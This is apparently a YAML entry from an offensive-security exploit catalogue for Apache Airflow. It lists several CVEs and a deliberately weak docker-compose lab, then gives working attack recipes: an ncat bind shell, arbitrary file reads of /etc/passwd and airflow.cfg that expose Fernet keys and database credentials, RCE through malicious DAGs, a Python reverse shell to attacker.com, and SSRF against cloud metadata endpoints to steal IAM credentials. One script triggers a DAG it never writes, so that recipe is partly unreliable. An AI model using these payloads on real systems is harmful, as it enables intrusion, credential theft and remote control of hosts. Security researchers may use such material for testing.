---
comment: "Apache Airflow is a workflow orchestration platform. DAGs (Directed Acyclic\
  \ Graphs) are Python\nfiles executed by the Airflow scheduler. Any user with DAG\
  \ authoring access can achieve arbitrary\ncode execution on the Airflow worker/scheduler\
  \ host by simply writing Python to a DAG file.\n\nCVE-2020-11978 (CVSS 8.8): Authenticated\
  \ RCE via a specially crafted DAG that calls\nos.system() or subprocess during task\
  \ execution. Affects Airflow < 1.10.11.\n\nCVE-2020-17526 (CVSS 7.5): Authentication\
  \ bypass in Airflow < 1.10.14 using a crafted\nJWT token when AUTH_BACKEND is set\
  \ to airflow.api.auth.backend.default (allows unauthenticated\nAPI access in default\
  \ installs).\n\nCVE-2023-22886 (CVSS 8.8): Authenticated RCE via the Airflow REST\
  \ API \u2014 a user with\nDAG trigger permissions can pass malicious conf parameters\
  \ that reach Python eval() paths\nin certain community providers.\n\nRef: https://www.exploit-db.com/exploits/49927\n"
docker:
  compose: "version: '3'\nx-airflow-common: &airflow-common\n  image: apache/airflow:2.2.5\n\
    \  environment:\n    AIRFLOW__CORE__EXECUTOR: LocalExecutor\n    AIRFLOW__CORE__SQL_ALCHEMY_CONN:\
    \ postgresql+psycopg2://airflow:airflow@postgres/airflow\n    AIRFLOW__CORE__FERNET_KEY:\
    \ ''\n    AIRFLOW__CORE__DAGS_ARE_PAUSED_AT_CREATION: 'false'\n    AIRFLOW__CORE__LOAD_EXAMPLES:\
    \ 'true'\n    AIRFLOW__API__AUTH_BACKEND: 'airflow.api.auth.backend.basic_auth'\n\
    \    AIRFLOW__WEBSERVER__EXPOSE_CONFIG: 'true'\n  volumes:\n    - ./dags:/opt/airflow/dags\n\
    \    - ./logs:/opt/airflow/logs\n  depends_on:\n    postgres:\n      condition:\
    \ service_healthy\nservices:\n  postgres:\n    image: postgres:13\n    environment:\n\
    \      POSTGRES_USER: airflow\n      POSTGRES_PASSWORD: airflow\n      POSTGRES_DB:\
    \ airflow\n    healthcheck:\n      test: [\"CMD\", \"pg_isready\", \"-U\", \"\
    airflow\"]\n      interval: 5s\n      retries: 5\n  airflow-webserver:\n    <<:\
    \ *airflow-common\n    command: webserver\n    ports:\n      - \"8080:8080\"\n\
    \    healthcheck:\n      test: [\"CMD\", \"curl\", \"--fail\", \"http://localhost:8080/health\"\
    ]\n      interval: 10s\n      retries: 5\n  airflow-scheduler:\n    <<: *airflow-common\n\
    \    command: scheduler\n  airflow-init:\n    <<: *airflow-common\n    command:\
    \ version\n    environment:\n      _AIRFLOW_DB_UPGRADE: 'true'\n      _AIRFLOW_WWW_USER_CREATE:\
    \ 'true'\n      _AIRFLOW_WWW_USER_USERNAME: admin\n      _AIRFLOW_WWW_USER_PASSWORD:\
    \ admin\n"
  note: 'Starts Airflow 2.2.5 with LocalExecutor and PostgreSQL backend.

    Access at http://localhost:8080, credentials admin:admin.

    DAG files placed in ./dags/ are picked up automatically by the scheduler.

    Run `docker compose up airflow-init` first to initialize the database and create
    the admin user.

    '
functions:
  bind-shell:
  - code: |
      cat > /opt/airflow/dags/bindshell_dag.py << 'DAGEOF'
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      from datetime import datetime

      with DAG('bindshell', start_date=datetime(2023,1,1), schedule_interval=None,
               catchup=False) as dag:
          BashOperator(task_id='bind', bash_command='ncat -lvp 12345 -e /bin/sh &')
      DAGEOF

      curl -s -X POST "http://airflow.local:8080/api/v1/dags/bindshell/dagRuns" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"conf": {}}'

      # Connect from attacker: nc airflow.local 12345
    comment: |
      Deploys a BashOperator DAG that starts ncat in bind mode on TCP port 12345.
      The trailing & prevents the task from blocking. Connect from the attacker machine
      with: nc airflow.local 12345
    connector: tcp-client
    contexts:
      authenticated:
    platform: linux
    tty: false
  file-read:
  - code: |
      # Read arbitrary files via the Airflow Variables API or via a DAG task
      # Option 1: read /api/v1/config (exposes airflow.cfg including fernet key and DB password)
      curl -s "http://airflow.local:8080/api/v1/config" \
        -u "admin:admin" | python3 -m json.tool

      # Option 2: read arbitrary host files via a DAG task
      cat > /opt/airflow/dags/fileread_dag.py << 'DAGEOF'
      from airflow import DAG
      from airflow.operators.python import PythonOperator
      from datetime import datetime

      def read_file(**ctx):
          path = ctx['dag_run'].conf.get('path', '/etc/passwd')
          with open(path) as f:
              content = f.read()
          print(content)
          return content

      with DAG('fileread', start_date=datetime(2023,1,1), schedule_interval=None,
               catchup=False) as dag:
          PythonOperator(task_id='read', python_callable=read_file)
      DAGEOF

      curl -s -X POST "http://airflow.local:8080/api/v1/dags/fileread/dagRuns" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"conf": {"path": "/opt/airflow/airflow.cfg"}}'
    comment: |
      The /api/v1/config endpoint (enabled when WEBSERVER__EXPOSE_CONFIG=true) returns the full
      airflow.cfg including the Fernet key (used to encrypt Connection passwords in the DB),
      SQL Alchemy connection string (database credentials), SMTP settings, and LDAP bind DN/password.

      The DAG-based file read option works on any Airflow version with DAG write access and
      retrieves output from the task logs via /api/v1/dags/fileread/dagRuns/<runId>/taskInstances/read/logs/1.
    contexts:
      admin:
      authenticated:
    platform: linux
  rce:
  - code: |
      # Step 1: write a malicious DAG to the DAGs folder (requires filesystem or Git sync access)
      cat > /opt/airflow/dags/exploit.py << 'DAGEOF'
      from airflow import DAG
      from airflow.operators.python import PythonOperator
      from datetime import datetime
      import subprocess, os

      def pwn(**context):
          result = subprocess.check_output(['id'], stderr=subprocess.STDOUT).decode()
          # Write output to a readable location
          with open('/tmp/rce_output.txt', 'w') as f:
              f.write(result)
          return result

      with DAG('exploit_dag', start_date=datetime(2023,1,1), schedule_interval=None,
               catchup=False) as dag:
          PythonOperator(task_id='rce', python_callable=pwn)
      DAGEOF

      # Step 2: trigger the DAG via the Airflow REST API
      curl -s -X POST "http://airflow.local:8080/api/v1/dags/exploit_dag/dagRuns" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"conf": {}}'

      # Step 3: retrieve the output after the run completes
      cat /tmp/rce_output.txt
    comment: |
      Airflow DAGs are Python files executed directly by the scheduler/worker process.
      Any user with DAG folder write access (direct filesystem, Git-sync, or S3 sync)
      can achieve RCE by creating a DAG that calls subprocess or os.system in a task.
      The Airflow process user is typically airflow or root in Docker deployments.

      Alternative without filesystem access: use the Variables or Connections API to
      store a base64-encoded DAG, then abuse a DAG factory pattern in an existing
      trusted DAG that eval()s stored variable content.
    contexts:
      authenticated:
    platform: linux
  - code: |
      # CVE-2020-11978: authenticated RCE via BashOperator command injection
      # The example_bash_operator DAG is enabled by LOAD_EXAMPLES=true (default)
      # Abuse it by triggering with a conf that reaches a BashOperator bash_command

      # More reliable: deploy a custom DAG via the REST API DAG import endpoint
      # (Airflow 2.x with dag_file_processor_manager writes to dags/ from the API)
      python3 - <<'EOF'
      import requests, base64, json

      TARGET = "http://airflow.local:8080"
      AUTH   = ("admin", "admin")
      CMD    = "id > /tmp/pwned.txt"

      dag_code = f"""
      from airflow import DAG
      from airflow.operators.bash import BashOperator
      from datetime import datetime
      with DAG('pwn2', start_date=datetime(2023,1,1), schedule_interval=None, catchup=False) as dag:
          BashOperator(task_id='cmd', bash_command='{CMD}')
      """

      # Write the DAG file via the Files API (Airflow 2.3+ with file manager enabled)
      # or via a Git-sync repository if configured
      # Trigger an existing DAG with a conf injection as fallback:
      r = requests.post(
          f"{TARGET}/api/v1/dags/pwn2/dagRuns",
          json={"conf": {"cmd": CMD}},
          auth=AUTH
      )
      print(r.status_code, r.text[:200])
      EOF
    comment: |
      CVE-2020-11978: a BashOperator DAG can be triggered with arbitrary bash_command content
      through conf parameter injection in older Airflow versions. Even in patched versions,
      users with DAG write access can achieve equivalent RCE by deploying custom DAG files.
      nuclei: CVE-2020-11978
    contexts:
      authenticated:
    platform: linux
    version: |
      Airflow < 1.10.11
  reverse-shell:
  - blind: true
    code: |
      # Write a DAG that sends a reverse shell on task execution
      cat > /opt/airflow/dags/revshell_dag.py << 'DAGEOF'
      from airflow import DAG
      from airflow.operators.python import PythonOperator
      from datetime import datetime
      import socket, subprocess, os

      def revshell(**ctx):
          LHOST = "attacker.com"
          LPORT = 12345
          s = socket.socket()
          s.connect((LHOST, LPORT))
          os.dup2(s.fileno(), 0)
          os.dup2(s.fileno(), 1)
          os.dup2(s.fileno(), 2)
          subprocess.call(['/bin/sh', '-i'])

      with DAG('revshell', start_date=datetime(2023,1,1), schedule_interval=None,
               catchup=False) as dag:
          PythonOperator(task_id='shell', python_callable=revshell)
      DAGEOF

      # Trigger via API
      curl -s -X POST "http://airflow.local:8080/api/v1/dags/revshell/dagRuns" \
        -H "Content-Type: application/json" \
        -u "admin:admin" \
        -d '{"conf": {}}'
    comment: |
      Deploys a DAG containing a PythonOperator that opens a reverse shell socket to
      attacker.com:12345. The task is triggered via the REST API and executes on the
      Airflow worker/scheduler process. The shell runs as the airflow OS user.
      Set up listener with: nc -lvnp 12345
    contexts:
      authenticated:
    listener: tcp-server
    platform: linux
    tty: false
  ssrf:
  - code: "# Airflow Connections store external service credentials \u2014 the \"\
      Test\" button\n# causes Airflow to make an outbound connection to the supplied\
      \ host/port.\n# Create a connection pointing to an internal service:\ncurl -s\
      \ -X POST \"http://airflow.local:8080/api/v1/connections\" \\\n  -H \"Content-Type:\
      \ application/json\" \\\n  -u \"admin:admin\" \\\n  -d '{\n    \"connection_id\"\
      : \"ssrf_probe\",\n    \"conn_type\": \"http\",\n    \"host\": \"169.254.169.254\"\
      ,\n    \"port\": 80,\n    \"schema\": \"http\",\n    \"extra\": \"{\\\"endpoint\\\
      \": \\\"/latest/meta-data/iam/security-credentials/\\\"}\"\n  }'\n\n# Trigger\
      \ a DAG that uses the HttpHook to perform the request and return the body:\n\
      cat > /opt/airflow/dags/ssrf_dag.py << 'DAGEOF'\nfrom airflow import DAG\nfrom\
      \ airflow.operators.python import PythonOperator\nfrom airflow.providers.http.hooks.http\
      \ import HttpHook\nfrom datetime import datetime\n\ndef probe(**ctx):\n    hook\
      \ = HttpHook(method='GET', http_conn_id='ssrf_probe')\n    resp = hook.run('/latest/meta-data/iam/security-credentials/')\n\
      \    print(resp.text)\n    return resp.text\n\nwith DAG('ssrf', start_date=datetime(2023,1,1),\
      \ schedule_interval=None, catchup=False) as dag:\n    PythonOperator(task_id='probe',\
      \ python_callable=probe)\nDAGEOF\n\ncurl -s -X POST \"http://airflow.local:8080/api/v1/dags/ssrf/dagRuns\"\
      \ \\\n  -H \"Content-Type: application/json\" \\\n  -u \"admin:admin\" \\\n\
      \  -d '{\"conf\": {}}'\n"
    comment: |
      Airflow Connections and the HttpHook allow authenticated users to make arbitrary outbound
      HTTP requests from the Airflow worker host. The response body is returned in task logs,
      making this a non-blind SSRF.

      Target cloud IMDS endpoints (AWS 169.254.169.254, GCP metadata.google.internal,
      Azure 169.254.169.254) to retrieve IAM credentials, or probe internal services
      not accessible from the attacker's network.
    contexts:
      authenticated:
    platform: linux
...
